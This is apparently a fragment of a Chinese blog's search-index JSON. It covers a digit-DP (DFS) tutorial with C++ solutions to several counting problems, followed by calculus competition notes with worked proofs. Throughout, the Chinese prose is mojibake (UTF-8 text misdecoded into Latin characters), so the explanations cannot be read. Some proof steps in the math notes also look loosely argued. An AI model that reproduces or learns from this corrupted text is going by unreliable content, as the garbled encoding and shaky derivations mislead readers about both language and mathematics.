$a_i$ï¼‰ å¦‚æœæœç´¢åˆ° $a_1\\cdots a_{pos} \\cdots a_n$ï¼ŒåŸæ•°ä½ä¸º $a_1\\cdots a_k \\cdots a_n$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¿…é¡»å¯¹æ¥ä¸‹æ¥æœç´¢çš„æ•°åŠ ä»¥é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è¶…è¿‡åŒºé—´å³ç«¯ç‚¹ $R$ï¼Œæ‰€ä»¥è¦å¼•å…¥ $limit$ è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœ $limit=1$ï¼Œé‚£ä¹ˆæœ€é«˜ä½æ•° $up \\le a_{pos+1}$ï¼Œå¦‚æœæ²¡æœ‰é™åˆ¶ï¼Œé‚£ä¹ˆ $up=9$ï¼ˆåè¿›åˆ¶ä¸‹ï¼‰è¿™ä¹Ÿå°±æ˜¯ç¡®å®šæœç´¢ä½æ•°ä¸Šç•Œçš„è¯­å¥ limit ? a[pos] : 9; å¦‚æœ $limit=1$ ä¸”å·²ç»å–åˆ°äº†èƒ½å–åˆ°çš„æœ€é«˜ä½æ—¶ $(a_{pos}=a_k)$ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ª $limit=1$ å¦‚æœ $limit=1$ ä¸”æ²¡æœ‰å–åˆ°èƒ½å–åˆ°çš„æœ€é«˜ä½æ—¶ $(a_{pos} \u003c a_k)$ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ª $limit=0$ å¦‚æœ $limit=0$ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ª $limit=0$ï¼Œå› ä¸ºå‰ä¸€ä½æ²¡æœ‰é™åˆ¶åä¸€ä½å¿…å®šæ²¡æœ‰é™åˆ¶ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™ $3$ ç§æƒ…å†µåˆæˆä¸€ä¸ªè¯­å¥è¿›è¡Œä¸‹ä¸€æ¬¡æœç´¢ï¼šlimit \u0026\u0026 i == up $(i$ä¸ºå½“å‰æšä¸¾çš„æ•°å­—$)$ å¯é€‰å‚æ•°ï¼š $pre:$ è¡¨ç¤ºä¸Šä¸€ä¸ªæ•°æ˜¯å¤šå°‘ æœ‰äº›é¢˜ç›®ä¼šç”¨åˆ°å‰é¢çš„æ•° $lead:$ å‰å¯¼é›¶æ˜¯å¦å­˜åœ¨ï¼Œ$lead=1$ å­˜åœ¨å‰å¯¼é›¶ï¼Œå¦åˆ™ä¸å­˜åœ¨ã€‚ ä¸€èˆ¬æ¥è¯´æœ‰äº›é¢˜ç›®ä¸åŠ é™åˆ¶å‰å¯¼é›¶ä¼šå½±å“æ•°å­—ç»“æ„ï¼Œæ‰€ä»¥ $lead$ æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„å‚æ•°ã€‚ å¦‚æœ $lead=1$ ä¸”å½“å‰ä½ä¸º $0$ï¼Œé‚£ä¹ˆè¯´æ˜å½“å‰ä½æ˜¯å‰å¯¼ $0$ï¼Œç»§ç»­æœç´¢ $pos+1$ï¼Œå…¶ä»–æ¡ä»¶ä¸å˜ã€‚ å¦‚æœ $lead=1$ ä¸”å½“å‰ä½ä¸ä¸º $0$ï¼Œé‚£ä¹ˆè¯´æ˜å½“å‰ä½æ˜¯æœ€é«˜ä½ï¼Œç»§ç»­æœç´¢ $pos+1$ï¼Œæ¡ä»¶å˜åŠ¨ã€‚ å¦‚æœ $lead=0$ï¼Œåˆ™ä¸éœ€è¦æ“ä½œã€‚ $sum:$ æœç´¢åˆ°å½“å‰æ‰€æœ‰æ•°å­—ä¹‹å’Œ æœ‰äº›é¢˜ç›®ä¼šå‡ºç°æ•°å­—ä¹‹å’Œçš„æ¡ä»¶ $cnt:$ æŸä¸ªæ•°å­—å‡ºç°çš„æ¬¡æ•° æœ‰äº›é¢˜ç›®ä¼šå‡ºç°æŸä¸ªæ•°å­—å‡ºç°æ¬¡æ•°çš„æ¡ä»¶ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:5:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‚æ•°åŸºæœ¬çš„å·®ä¸å¤šè¿™äº›ï¼Œæœ‰äº›è¾ƒéš¾é¢˜ç›®ä¼šç”¨åˆ°æ›´å¤šæ–¹æ³•æˆ–æ”¹å˜$\\text{DP}$çŠ¶æ€ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:6:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®1ï¼šä¸è¦62 é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´ $[L,R]$ ä¸èƒ½å‡ºç° $4$ å’Œ $62$ çš„æ•°çš„ä¸ªæ•° åˆ†æï¼š é¦–å…ˆæ­¤é¢˜ä¸éœ€è¦ $lead$ï¼Œå…¶æ¬¡æœ‰ $62$ æ‰€ä»¥è¦è®°å‰é©± $pre$ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:7:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 15; int l, r, dp[N][N], len, a[N]; int dfs(int pos, int pre, int limit) { if (!pos) return 1; if (!limit \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { if (i == 4 || (i == 2 \u0026\u0026 pre == 6)) continue; res += dfs(pos - 1, i, limit \u0026\u0026 i == up); } return limit ? res : dp[pos][pre] = res; } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % 10, x /= 10; return dfs(len, 0, 1); } signed main() { while (cin \u003e\u003e l \u003e\u003e r, l || r) { cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:8:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":" é¢˜ç›®2ï¼šwindyæ•° é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´ $[L,R]$ ç›¸é‚»æ•°å­—ä¹‹å·®è‡³å°‘ä¸º $2$ çš„æ•°çš„ä¸ªæ•° åˆ†æï¼š æœç´¢åˆå§‹æ¡ä»¶ç¬¬äºŒä¸ªå‚æ•° $pre$ å¿…é¡»å¡«ä¸€ä¸ª $\\le -2$ çš„æ•°æ¥ä¿è¯å¯ä»¥æœç´¢ä¸‹å»ï¼Œä¸ç„¶ä¼šå‡ºé”™ã€‚æ­¤é¢˜éœ€è¦è®°å½•å‰å¯¼é›¶ï¼Œä¸ç„¶å¿½è§†å‰å¯¼é›¶çš„å½±å“ä¼šé€ æˆæœ€é«˜ä½æ•° $-0\u003c2$ æ— æ³•ç»§ç»­æœç´¢çš„æƒ…å†µã€‚ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:9:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 15; int l, r, a[N], len, dp[N][N]; int dfs(int pos, int pre, int lead, int limit) { if (!pos) return 1; if (!limit \u0026\u0026 !lead \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { if (abs(pre - i) \u003c 2) continue; if (lead \u0026\u0026 !i) { res += dfs(pos - 1, -2, lead \u0026\u0026 !i, limit \u0026\u0026 i == up); } else { res += dfs(pos - 1, i, lead \u0026\u0026 !i, limit \u0026\u0026 i == up); } } return limit ? res : (lead ? res : dp[pos][pre] = res); } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % 10, x /= 10; return dfs(len, -2, 1, 1); } signed main() { cin \u003e\u003e l \u003e\u003e r; cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:10:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®3ï¼šæ•°å­—æ¸¸æˆ é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´ $[L,R]$ å„ä½æ•°å­—éä¸¥æ ¼å•è°ƒé€’å¢çš„æ•°çš„ä¸ªæ•° åˆ†æï¼š å‰å¯¼é›¶ä¸å½±å“ï¼Œæ‰€ä»¥ä¸éœ€è¦ $lead$ã€‚æ‰€ä»¥åªéœ€è¦åˆ¤æ–­æšä¸¾çš„ä½æ•°æ˜¯ä¸æ˜¯éä¸¥æ ¼é€’å¢æ¥åˆ¤æ–­æ˜¯å¦ç»§ç»­æœç´¢ã€‚ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:11:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 15; int l, r, a[N], len, dp[N][N]; int dfs(int pos, int pre, int limit) { if (!pos) return 1; if (!limit \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { if (i \u003c pre) continue; res += dfs(pos - 1, i, limit \u0026\u0026 i == up); } return limit ? res : dp[pos][pre] = res; } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % 10, x /= 10; return dfs(len, 0, 1); } signed main() { while (cin \u003e\u003e l \u003e\u003e r) { cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:12:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®4ï¼šæ•°å­—æ¸¸æˆâ…¡ é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´ $[L,R]$ å„ä½æ•°å­—ä¹‹å’Œ $\\mod n=0$ çš„æ•°çš„ä¸ªæ•° åˆ†æï¼š å‰å¯¼é›¶ä¸å½±å“ï¼Œæ‰€ä»¥ä¸éœ€è¦ $lead$ã€‚æ­¤é¢˜æ¶‰åŠåˆ°æ•°å­—å’Œ ï¼Œæ‰€ä»¥è¦ç”¨åˆ° $sum$ï¼Œä¸éœ€è¦è®°å½•å‰é©± $pre$ï¼Œæ‰€ä»¥ $\\text{dp}$ çŠ¶æ€å˜ä¸ºäº† $\\text{dp}[pos][sum]$ã€‚è¾¹ç•Œæ¡ä»¶ä¸º $sum \\bmod n=0$ï¼Œè¿”å› $1$ï¼Œå¦åˆ™è¿”å› $0$ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:13:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 1e3 + 5; int l, r, p, len, a[N], dp[N][N]; int dfs(int pos, int sum, int limit) { if (!pos) return sum % p == 0; if (!limit \u0026\u0026 dp[pos][sum] != -1) return dp[pos][sum]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { res += dfs(pos - 1, sum + i, limit \u0026\u0026 i == up); } return limit ? res : dp[pos][sum] = res; } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % 10, x /= 10; return dfs(len, 0, 1); } signed main() { while (cin \u003e\u003e l \u003e\u003e r \u003e\u003e p) { cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:14:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®5ï¼šåº¦çš„æ•°é‡ é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´$[L,R]$æ°å¥½ä¸º$K$ä¸ª$B$çš„å¹‚æ¬¡æ–¹ä¹‹å’Œçš„æ•°çš„ä¸ªæ•° åˆ†æï¼š å‰å¯¼é›¶ä¸å½±å“ï¼Œæ‰€ä»¥ä¸éœ€è¦$lead$ã€‚å› ä¸ºè¦è®°å½•æ•°é‡ï¼Œæ‰€ä»¥è¦å¢åŠ å˜é‡$cnt$ã€‚å‰é©±$pre$ä¸éœ€è¦è®°å½•ã€‚åˆ¤æ–­è¾¹ç•Œæ—¶åªè¦æœ€åæ•°é‡$cnt=k$ï¼Œè¿”å›$1$ï¼Œå¦åˆ™è¿”å›$0$ã€‚åŒæ—¶æšä¸¾æ•°å­—æ—¶å¦‚æœå‰é¢ç³»æ•°ä¸ä¸º$1$æˆ–è€…æ²¡æœç´¢å®Œå°±å·²ç»$K$ä¸ªäº†ï¼Œé‚£ä¹ˆå°±continue ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:15:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 35; int l, r, k, b, a[N], len, dp[N][N]; int dfs(int pos, int cnt, int limit) { if (!pos) return cnt == k; if (!limit \u0026\u0026 dp[pos][cnt] != -1) return dp[pos][cnt]; int res = 0, up = limit ? a[pos] : b - 1; for (int i = 0; i \u003c= up; i ++) { if ((i == 1 \u0026\u0026 cnt == k) || i \u003e 1) continue; res += dfs(pos - 1, cnt + (i == 1), limit \u0026\u0026 i == up); } return limit ? res : dp[pos][cnt] = res; } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % b, x /= b; return dfs(len, 0, 1); } signed main() { cin \u003e\u003e l \u003e\u003e r \u003e\u003e k \u003e\u003e b; cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:16:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®6ï¼šè®¡æ•°é—®é¢˜ é¢˜æ„ï¼š ç»Ÿè®¡åŒºé—´$[L,R]$å‡ºç°$0123456789$çš„å„ä¸ªæ•°å­—æ€»æ¬¡æ•° åˆ†æï¼š éœ€è¦ç”¨åˆ°$lead$ï¼Œéœ€è¦ç”¨åˆ°æ¬¡æ•°æ€»å’Œ$sum$ï¼Œè¿˜æœ‰å“ªä¸ªæ•°å­—$num$ã€‚åŸºæœ¬ä¸Šå¯ä»¥å¥—æ¨¡æ¿ï¼Œæ³¨æ„è¾¹ç•Œæ¡ä»¶ã€‚ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:17:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 15; int l, r, len, a[N], dp[N][N]; int dfs(int pos, int sum, int num, int lead, int limit) { if (!pos) { if (lead \u0026\u0026 !num) return 1; return sum; } if (!limit \u0026\u0026 !lead \u0026\u0026 dp[pos][sum] != -1) return dp[pos][sum]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { int t; if (i == num) { if (!num) { t = sum + (lead == 0); } else { t = sum + 1; } } else { t = sum; } res += dfs(pos - 1, t, num, lead \u0026\u0026 i == 0, limit \u0026\u0026 i == up); } return limit ? res : (lead ? res : dp[pos][sum] = res); } int cal(int x, int num) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % 10, x /= 10; return dfs(len, 0, num, 1, 1); } signed main() { while (cin \u003e\u003e l \u003e\u003e r, l || r) { if (l \u003e r) swap(l, r); for (int i = 0; i \u003c= 9; i ++) cout \u003c\u003c cal(r, i) - cal(l - 1, i) \u003c\u003c \" \"; cout \u003c\u003c endl; } } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:18:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»¥ä¸Šåªæ˜¯æ¨¡æ¿é¢˜ç”¨æ¥ç†Ÿæ‚‰æ•°ä½$\\text{DP}$ï¼Œå½“ç„¶åšè¿™äº›é¢˜è¿˜è¿œè¿œä¸å¤Ÿï¼Œéœ€è¦æ›´å¤šç»ƒä¹ ã€‚ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:19:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜å•ï¼š CodeForce1036C Classy Numbers æ‰¾åˆ°åŒºé—´$[L,R]$æœ‰ä¸è¶…è¿‡$3$ä¸ªé$0$çš„æ•°çš„ä¸ªæ•° æ´›è°·P4127 åŒç±»åˆ†å¸ƒ æ‰¾åˆ°åŒºé—´$[L,R]$å„ä½æ•°å­—ä¹‹å’Œèƒ½æ•´é™¤åŸæ•°çš„æ•°çš„ä¸ªæ•° æ´›è°·P4317 èŠ±ç¥çš„æ•°è®ºé¢˜ è®¾ $\\text{sum}(i)$ è¡¨ç¤º $i$ çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ $1$ çš„ä¸ªæ•°ã€‚ç»™å‡ºä¸€ä¸ªæ­£æ•´æ•° $N$ ï¼Œæ±‚ $\\prod _{i=1}^{N}\\text{sum}(i)$ â€‹ è¾ƒéš¾ï¼š HDU 3693 Math teacherâ€™s homework HDU 4352 XHXJâ€™s LIS CodeForce 55D Beautiful numbers AcWing 1086 æ¨7ä¸æˆå¦» POJ 3252 Round Numbers ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:20:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["æ•°å­¦"],"content":"$1.å·²çŸ¥å‡½æ•°f(x)è¿ç»­ä¸”f(x+2)-f(x)=\\cos x,\\int_{0}^{2}f(x)dx=1,æ±‚\\int^{1}_{-1}f(x)dx$ åˆ†æï¼š æ„é€ ã€‚é¢˜ç›®ä¸­ç»™å‡ºäº†ä¸¤ç‚¹å·®çš„å‡½æ•°å¼ï¼Œæƒ³åˆ°æ„é€ å˜åŠ¨ä¸Šä¸‹é™ç§¯åˆ†ï¼Œé¢˜çœ¼$\\int^{2}_{0}f(x)dx=1$ï¼Œæç¤ºæ„é€ $F(x)$å¹¶è§£å‡ºä»»æ„å¸¸æ•°$C$ $$ä»¤F(x)=\\int^{x+2}_{x}f(t)dt,åˆ™Fâ€™(x)=f(x+2)-f(x)=\\cos x$$ $$\\therefore F(x)=\\sin x+C$$ $$\\because \\int^{2}_{0}f(x)dx=1,\\therefore F(0)=1$$ $$å¸¦å…¥ F(x)=\\sin x+C,å¾—C=1$$ $$\\therefore F(x)=\\sin x+1$$ $$åˆ™\\int^{1}_{-1}f(x)dx=F(-1)=1-\\sin 1$$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:1:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"$2.è®¡ç®—I=\\int_{L}\\frac{(x-1)\\text{d}y-y\\text{d}x}{(x-1)^2+y^2},Læ˜¯ä»(-2,0)åˆ°(2,0)çš„ä¸ŠåŠæ¤­åœ†\\frac{x^2}{4}+y^2=1$ åˆ†æï¼š æ ¼æ—å…¬å¼+ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†çš„è·¯å¾„æ— å…³æ€§ã€‚ çœ‹åˆ°è¿™ç§å½¢å¼åº”è¯¥æƒ³åˆ°è·¯å¾„æ— å…³ï¼ŒåŒæ—¶åˆ†æ¯æ˜¯ä¸ªåœ†çš„æ–¹ç¨‹ï¼Œè¦æ³¨æ„è€ƒè™‘åˆ†æ¯ä¸º$0$çš„æƒ…å†µï¼Œç»å…¸å¥—è·¯ç”¨ä¸€ä¸ªå¾ˆå°çš„åœ†è®¡ç®—æ— æ„ä¹‰çš„ç‚¹ï¼Œå†æ¬¡ç”¨æ ¼æ—å…¬å¼ã€‚ $$I=\\int_{L}\\frac{-y\\text{d}x+(x-1)\\text{d}y}{(x-1)^2+y^2}$$ $$P=\\frac{-y}{(x-1)^2+y^2},Q=\\frac{x-1}{(x-1)^2+y^2}$$ $$åˆ™\\frac{\\partial P}{\\partial y}=\\frac{\\partial Q}{\\partial x}=\\frac{y^2-(x-1)^2}{((x-1)^2+y^2)^2}$$ $$\\because Lä¸ºå•è¿é€šåŒºåŸŸ\\therefore Iä¸è·¯å¾„æ— å…³$$ $$\\because (x-1)^2+y^2\\ne 0,\\therefore ä¸åŒ…å«(1,0)$$ $$\\therefore å–L_{\\varepsilon}=(x-1)^2+y^2=\\varepsilon ^2(\\varepsilon \u003e0ä¸”è¶³å¤Ÿå°),y\\ge 0$$ $$\\int_{L_\\varepsilon}\\frac{(x-1)\\text{d}y-y\\text{d}x}{(x-1)^2+y^2}=-\\frac{1}{\\varepsilon^2}\\iint_{L_\\varepsilon}\\text{d}x\\text{d}y=-\\pi$$ $$\\therefore I=0+\\int_{L_\\varepsilon}=-\\pi$$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:2:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"$3.è®¾f(x)åœ¨[0,1]ä¸ŠäºŒé˜¶å¯å¯¼,f(0)=0,f(1)=1,\\int^{1}_{0}f(x)\\text{d}x=1$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:3:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"$(1)è¯æ˜ \\exists \\xi \\in(0,1),ä½¿å¾—fâ€™(\\xi)=0$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:4:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"$(2)è¯æ˜ï¼š\\exists \\eta \\in (0,1),ä½¿å¾—fâ€™'(\\eta)\u003c-2$ $(1)$ åˆ†æï¼š çœ‹è§å¯¼æ•°å…ˆæƒ³åˆ°ç½—å°”å®šç†ï¼Œä¸¤ä¸ªç‚¹ä¸€ä¸ªç”¨1ï¼Œä¸€ä¸ªå°±è¦å»é¢˜å¹²æ‰¾ç‚¹ï¼Œå‘ç°ç§¯åˆ†å¼$\\int_{0}^{1}f(x)\\text{d}x=1$ï¼Œå‘ç°æ°å¥½ç¬¦åˆç§¯åˆ†ä¸­å€¼å®šç†$\\frac{\\int^{1}_{0}f(x)\\text{d}x}{1-0}=f(\\xi)$ï¼Œäºæ˜¯æ‰¾åˆ°ç¬¬äºŒä¸ªç‚¹$\\xi_1$ã€‚ å†ç”¨è¿™ä¸¤ä¸ªç‚¹æ‰¾åˆ°$\\xi$ $$\\because \\int^{1}_{0}f(x)\\text{d}x=1$$ $$\\therefore ç”±ç§¯åˆ†ä¸­å€¼å®šç†å¾—:\\exists \\xi_1\\in(0,1),ä½¿å¾—f(\\xi_1)=1$$ $$\\because f(\\xi_1)=1,f(1)=1$$ $$\\therefore ç”±ç½—å°”ä¸­å€¼å®šç†å¾—:\\exists \\xi\\in(\\xi_1,1),ä½¿å¾—fâ€™(\\xi)=0$$ $(2)$ åˆ†æï¼š æ„é€ +åè¯ã€‚çœ‹åˆ°$fâ€™'(\\eta)\u003c-2$åº”è¯¥æƒ³åˆ°æ„é€ å‡½æ•°ï¼ŒäºŒé˜¶å¯¼$\u003e0$å¯ä»¥åˆ¤æ–­å‡½æ•°çš„å‡¹å‡¸æ€§ï¼Œå†æ ¹æ®é¢˜ç›®çš„å·²çŸ¥æ¡ä»¶æœ‰ç§¯åˆ†ï¼Œæ‰€ä»¥åˆ©ç”¨å‡¹å‡½æ•°çš„ç§¯åˆ†æ€§è´¨æ¥è¯æ˜ä¸ç­‰å¼ã€‚ $$ä»¤g(x)=f(x)+x^2$$ $$å‡è®¾fâ€™'(x)\\ge-2,å³fâ€™'(x)+2\\ge0$$ $$\\because gâ€™'(x)=fâ€™'(x)+2$$ $$\\therefore gâ€™'(x)\\ge0$$ $$\\therefore gâ€™'(x)ä¸ºå‡¹å‡½æ•°$$ $$åˆ™æœ‰:\\int_{0}^{1}g(x) \\text{d}x \\le \\int_{0}^{1}2x\\text{d}x=1$$ $$\\int_{0}^{1}g(x) \\text{d}x=\\int_{0}^{1}(f(x)+x^2) \\text{d}x=\\frac{4}{3} \u003e 1,çŸ›ç›¾$$ $$\\therefore \\exists \\eta \\in (0,1),ä½¿å¾—gâ€™'(x)\u003c0$$ $$å³:\\exists \\eta \\in (0,1),ä½¿å¾—fâ€™'(\\eta)\u003c-2$$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:5:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"$4.è®¾æ­£å€¼å‡½æ•°f(x)åœ¨[a,b]ä¸Šè¿ç»­,\\int_{a}^{b}f(x)\\text{d}x=A,è¯æ˜:\\int_{a}^{b}f(x)e^{f(x)}\\text{d}x\\int_{a}^{b}\\frac{1}{f(x)}\\text{d}x \\ge (b-a)(b-a+A)$ 